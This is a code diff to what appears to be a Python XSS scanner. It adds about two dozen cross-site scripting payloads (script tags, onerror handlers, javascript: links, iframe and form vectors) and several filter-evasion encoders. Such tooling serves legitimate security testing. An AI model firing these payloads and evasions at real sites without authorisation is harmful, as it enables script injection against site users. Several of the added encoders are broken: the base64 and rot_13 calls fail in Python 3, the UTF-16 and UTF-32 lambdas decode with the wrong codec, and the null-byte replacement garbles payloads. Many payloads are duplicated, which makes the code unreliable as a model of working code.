@@ -32,6 +32,31 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 xss_payloads = [
     '<script>alert("XSS")</script>',
     '<img src="x" onerror="alert(\'XSS\')" />',
+    '<script>alert("XSS")</script>',
+    '<img src=x onerror=alert("XSS")>',
+    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
+    '"><script>alert("XSS")</script>',
+    '"><img src=x onerror=alert("XSS")>',
+    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
+    'javascript:alert("XSS")',
+    'javascript:confirm("XSS")',
+    'javascript:eval("alert(\'XSS\')")',
+    '<script>alert("XSS")</script>',
+    '<img src=x onerror=alert("XSS")>',
+    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
+    '"><script>alert("XSS")</script>',
+    '"><img src=x onerror=alert("XSS")>',
+    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
+    'javascript:alert("XSS")',
+    'javascript:confirm("XSS")',
+    'javascript:eval("alert(\'XSS\')")',
+    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
+    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
+    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
+    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
+    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
+    '<img src=x onerror=confirm("XSS")>',
+    '<img src=x onerror=eval("alert(\'XSS\')")>',
 ]
 
 obfuscation_methods = [
@@ -39,6 +64,13 @@ obfuscation_methods = [
     lambda payload: payload.replace("alert", "confirm") if payload else payload,
     lambda payload: "".join(f"\\x{ord(char):02x}" for char in payload) if payload else payload,  # Hex encoding
     lambda payload: "".join(f"\\u{ord(char):04x}" for char in payload) if payload else payload,  # Unicode encoding
+    lambda payload: payload.encode('base64').decode(),  # Base64 encoding
+    lambda payload: payload.encode('utf-16').decode(),  # UTF-16 encoding
+    lambda payload: payload.encode('utf-32').decode(),  # UTF-32 encoding
+    lambda payload: payload.encode('rot_13').decode(),  # ROT13 encoding
+    lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,  # Percent encoding
+    lambda payload: "".join(f"&#x{ord(char):X};" for char in payload) if payload else payload,  # HTML Entity encoding
+    lambda payload: payload.replace('a', '\x00a').replace('l', '\x00c'),  # Null Byte encoding
 ]
 
 
